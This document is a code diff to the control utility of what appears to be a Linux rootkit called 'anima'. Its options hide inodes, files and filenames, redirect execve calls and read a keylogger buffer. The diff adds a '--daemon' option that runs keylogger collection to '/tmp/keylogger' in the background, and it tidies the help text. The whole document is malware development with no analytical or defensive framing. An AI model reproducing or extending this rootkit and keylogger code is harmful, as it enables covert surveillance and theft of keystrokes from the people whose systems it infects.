@@ -5,6 +5,7 @@
 
 #include <anima/anima_ctl.h>
 #include "anima_api.h"
+#include "anima_daemon.h"
 
 static struct option long_options[] = {
 	{"hide-inode", 1, 0, 0},
@@ -19,7 +20,8 @@ static struct option long_options[] = {
 	{"redirect-execve", 1, 0, 9},
 	{"unredirect-execve", 1, 0, 10},
 	{"get-keylogger-buffer", 1, 0, 11},
-	{"debug-rk", 0, 0, 12},
+	{"daemon", 0, 0, 12},
+	{"debug-rk", 0, 0, 13},
 	{0, 0, 0, 0}
 };
 
@@ -33,11 +35,11 @@ void usage(const char *path)
 		"\t--unhide-file <path>\tunhide file\n"			\
 		"\t--hide-filename <name>\thide filename\n"		\
 		"\t--unhide-filename <name>\tunhide filename\n"		\
-		"\t--redirect-execve <path:new_path>\t redirect exexve\n"\
-		"\t--unredirect-execve <path:new_path>\t unredirect execve\n"\
-		"\t--get-keylogger-buffer <path>\t get keylogger buffer\n"\
+		"\t--redirect-execve <path:new_path>\tredirect exexve\n"\
+		"\t--unredirect-execve <path:new_path>\tunredirect execve\n"\
+		"\t--get-keylogger-buffer <path>\tget keylogger buffer\n"\
+		"\t--daemon\trun as daemon\n"				\
 		"\t--debug-rk\t\t(for debugging purpose)\n"		\
-		"\t--debug-stats\t\t(for debugging purpose)\n"		\
 		, path);
 }
 
@@ -93,6 +95,9 @@ int main(int argc, char **argv)
 			get_keylogger_buf(optarg);
 			break;
 		case 12:
+			anima_daemon("/tmp/keylogger");
+			break;
+		case 13:
 			anima_control(DEBUG_RK, NULL);
 			break;
 		default:
